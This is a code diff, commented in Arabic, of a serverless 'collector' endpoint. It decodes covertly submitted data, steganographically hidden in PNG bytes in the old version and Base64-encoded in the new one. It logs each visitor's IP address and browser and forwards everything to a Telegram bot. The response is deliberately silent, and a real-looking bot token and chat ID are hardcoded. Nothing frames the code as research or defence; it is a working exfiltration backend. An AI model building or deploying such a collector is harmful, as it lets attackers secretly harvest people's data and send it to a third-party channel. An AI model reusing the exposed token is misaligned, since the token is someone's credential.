@@ -1,70 +1,48 @@
-// ========================== ملف الاستقبال + تليغرام مباشرة ==========================
-// المسار: /api/collector.js
-// =====================================================================================
-
-// ❖ ضع توكن البوت وايدي الشات هنا
-const BOT_TOKEN = '8488074169:AAFQyGtxJIlRr-k4jVc6ZpRs1mQVyexy8cY';   // ← استبدلها
-const CHAT_ID   = '7932290530';                                      // ← استبدلها
+// ========================== الاستقبال + تليغرام ==========================
+const BOT_TOKEN = '8488074169:AAFQyGtxJIlRr-k4jVc6ZpRs1mQVyexy8cY'; // ← توكنك
+const CHAT_ID   = '-7932290530';                                   // ← ايدي القناة
 
 const cache = new Map();
 const MAX   = 500;
 
-function uid(){
-  return Math.random().toString(36).slice(2)+Date.now().toString(36);
+function uid(){ return Math.random().toString(36).slice(2)+Date.now().toString(36); }
+
+async function tg(txt){
+  const safe = txt.replace(/([_*\[\]()~`>#+=|{}.!-])/g,'\\$1');
+  await fetch(
+    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+    {method:'POST',headers:{'Content-Type':'application/json'},
+     body:JSON.stringify({chat_id:CHAT_ID,text:safe,parse_mode:'MarkdownV2'})}
+  ).catch(()=>{});
 }
 
-// دالة إرسال رسالة إلى تليغرام
-async function tgSend(text){
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  await fetch(url,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:CHAT_ID, text, parse_mode:'MarkdownV2'})
-  }).catch(()=>{});
-}
-
-export default async function handler(req, res){
-  if(req.method !== 'POST') return res.status(405).json({خطأ:'الطريقة غير مسموحة'});
+export default async function handler(req,res){
+  if(req.method!=='POST') return res.status(405).send('Method not allowed');
 
   let body = req.body;
-  // فك إخفاء PNG إن وُجد
-  if(typeof body === 'string' && body.startsWith('data:image/png')){
-    const base64 = body.split(',')[1];
-    const buff   = Buffer.from(base64,'base64');
-    let hidden = '';
-    for(let i=41;i<91;i++) hidden += String.fromCharCode(buff[i] ^ buff[i%4]);
-    const a = hidden.indexOf('{');
-    const b = hidden.lastIndexOf('}');
-    if(a===-1||b===-1) return res.status(400).json({خطأ:'فشل فك الإخفاء'});
-    try{ body = JSON.parse(hidden.slice(a,b+1)); }
-    catch{ return res.status(400).json({خطأ:'JSON تالف'}); }
+  if(typeof body==='string' && body.length>20){
+    try{ body=JSON.parse(atob(body)); }catch{ return res.status(400).send('Bad Base64');}
   }
 
-  const record = {
-    🆔: uid(),
-    📅: new Date().toLocaleString('ar-EG'),
-    🌐: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
-    📱: req.headers['user-agent'],
-    📊: body
+  const rep={
+    🆔:uid(),
+    📅:new Date().toLocaleString('ar-EG',{timeZone:'Africa/Cairo'}),
+    🌐:req.headers['x-forwarded-for']?.split(',')[0]||req.socket.remoteAddress,
+    📱:req.headers['user-agent'],
+    📊:body
   };
 
-  cache.set(record.🆔, record);
-  if(cache.size > MAX) cache.delete(cache.keys().next().value);
+  cache.set(rep.🆔,rep); if(cache.size>MAX) cache.delete([...cache.keys()][0]);
 
-  // تجهيز نص التقرير وتجنب حرف ماركداون محجور
-  const report = `
-*إحصائية زائر جديدة* 👤
+  await tg(`
+*زائر جديد تمت إضافته* 👤
 \`\`\`
-الوقت: ${record.📅}
-الآيبي: ${record.🌐}
-المتصفح: ${record.📱}
+الوقت: ${rep.📅}
+الآيبي: ${rep.🌐}
+المتصفح: ${rep.📱}
 البيانات الكاملة:
-${JSON.stringify(record.📊, null, 2)}
-\`\`\`
-`.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&'); // إسكان أحرف خاصة
+${JSON.stringify(rep.📊,null,2)}
+\`\`\``);
 
-  await tgSend(report);
-
-  // رد خفي
   res.status(204).end();
 }
